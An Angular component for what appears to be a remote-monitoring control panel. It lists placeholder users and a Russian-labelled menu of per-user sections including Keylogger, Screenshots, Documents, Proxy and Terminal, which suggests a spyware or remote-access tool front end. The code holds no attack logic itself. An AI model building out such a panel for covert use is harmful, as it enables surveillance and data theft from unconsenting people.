import { ServerService } from './../../server.service';
import { Component, OnInit, ViewChild, AfterViewInit} from '@angular/core';
import { of } from 'rxjs';
import { Router } from '@angular/router';

@Component({
  selector: 'ngx-users',
  templateUrl: './users.component.html',
  styleUrls: ['./users.component.scss']
})
export class UsersComponent implements OnInit {

  users: { name: string, title: string ,picture:string}[] = [
    { name: 'Carla Espinosa', title: 'Nurse',picture:'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2F236x%2F2d%2Fe9%2F36%2F2de9366c21a68b93160515b8d3d6368d.jpg&f=1&nofb=1' },
    { name: 'Bob Kelso', title: 'Doctor of Medicine' ,picture:'https://pbs.twimg.com/profile_images/1118183291411206144/X_7ZoNDL.png'},
    { name: 'Janitor', title: 'Janitor',picture:'https://ih1.redbubble.net/image.846505055.7003/flat,750x1000,075,f.u3.jpg' },
    { name: 'Perry Cox', title: 'Doctor of Medicine' ,picture:'https://i.imgur.com/2epwyls.jpg'},
    { name: 'Ben Sullivan', title: 'Carpenter and photographer',picture:'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSNvjgWKTHI2XcaNRzzgVyCF9N1yu2hgRuB7w&usqp=CAU' },
    { name: 'Carla Espinosa', title: 'Nurse',picture:'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2F236x%2F2d%2Fe9%2F36%2F2de9366c21a68b93160515b8d3d6368d.jpg&f=1&nofb=1' },
    { name: 'Bob Kelso', title: 'Doctor of Medicine' ,picture:'https://pbs.twimg.com/profile_images/1118183291411206144/X_7ZoNDL.png'},
    { name: 'Janitor', title: 'Janitor',picture:'https://ih1.redbubble.net/image.846505055.7003/flat,750x1000,075,f.u3.jpg' },
    { name: 'Perry Cox', title: 'Doctor of Medicine' ,picture:'https://i.imgur.com/2epwyls.jpg'},
    { name: 'Carla Espinosa', title: 'Nurse',picture:'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2F236x%2F2d%2Fe9%2F36%2F2de9366c21a68b93160515b8d3d6368d.jpg&f=1&nofb=1' },
    { name: 'Bob Kelso', title: 'Doctor of Medicine' ,picture:'https://pbs.twimg.com/profile_images/1118183291411206144/X_7ZoNDL.png'},
    { name: 'Janitor', title: 'Janitor',picture:'https://ih1.redbubble.net/image.846505055.7003/flat,750x1000,075,f.u3.jpg' },
    { name: 'Perry Cox', title: 'Doctor of Medicine' ,picture:'https://i.imgur.com/2epwyls.jpg'},
  ];

  menu: {title: string, url: string, routerLink: string, active: boolean}[] = [
    {title: 'Загрузки',  url: '../../../assets/images/user-actions/31996.svg', routerLink: '/pages/users/downloads',   active: false},
    {title: 'Скриншоты', url: '../../../assets/images/user-actions/31997.svg', routerLink: '/pages/users/screenshots', active: false},
    {title: 'Видео',     url: '../../../assets/images/user-actions/32001.svg', routerLink: '/pages/users/videos',      active: false},
    {title: 'Кейлоггер', url: '../../../assets/images/user-actions/31995.svg', routerLink: '/pages/users/keylog',      active: false},
    {title: 'Документы', url: '../../../assets/images/user-actions/31998.svg', routerLink: '/pages/users/documents',   active: false},
    {title: 'Proxy',     url: '../../../assets/images/user-actions/31999.svg', routerLink: '/pages/users/proxy',       active: false},
    {title: 'Терминал',  url: '../../../assets/images/user-actions/32000.svg', routerLink: '/pages/users/terminal',    active: false},
  ];

  firstTime: boolean = true;
  public MAINUSER:string;
  constructor(public server: ServerService,public router: Router) {
     server.getAllUsers();
   }
  ngOnInit(){}

  GetUserToRoute(uuid:string){
    if (this.firstTime && uuid == this.server.allusers[0].uuid) {
      return;
    }
    this.firstTime = false;
    this.MAINUSER = uuid;
    this.server.editUuid(uuid);
    this.router.navigate(['/pages/users/default']);
    this.menu.forEach(element => {
      element.active = false;
    });
  }

  sectionClick(section)
  {
    if (section.active) {
      this.server.editUuid(this.MAINUSER);
      this.router.navigate(['/pages/users/default']);
      section.active = false;
      return;
    }
    this.menu.forEach(element => {
      element.active = false;
    });
    section.active = true;
  }
}
